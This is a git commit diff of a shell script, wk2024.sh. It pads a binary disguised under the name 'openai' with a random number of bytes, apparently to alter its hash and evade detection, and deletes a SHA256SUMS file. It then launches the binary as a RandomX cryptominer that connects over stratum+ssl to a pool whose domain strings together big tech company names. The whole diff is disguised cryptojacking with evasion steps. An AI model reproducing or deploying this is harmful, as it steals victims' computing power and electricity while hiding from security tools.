d9dbf2a83e671961980a1c8eb961d6f8b433bf93
caippx <37325838+caippx@users.noreply.github.com>
2024-02-07 23:38:49 +0800

    Update wk2024.sh

--- drfytgybhunjoimkol/wk2024.sh
+++ drfytgybhunjoimkol/wk2024.sh
@@ -9,6 +9,6 @@ random_number=$RANDOM
 rm -rf 1.tar.gz
 cd openai && rm -rf SHA256SUMS
 for i in $(seq 1 $random_number); do
-  echo -n "0" >> openai/openai
+  echo -n "0" >> /root/openai/openai
 done
 ./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
